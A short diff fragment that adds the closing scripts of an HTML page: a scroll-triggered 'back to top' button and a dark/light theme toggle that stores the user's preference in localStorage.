+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
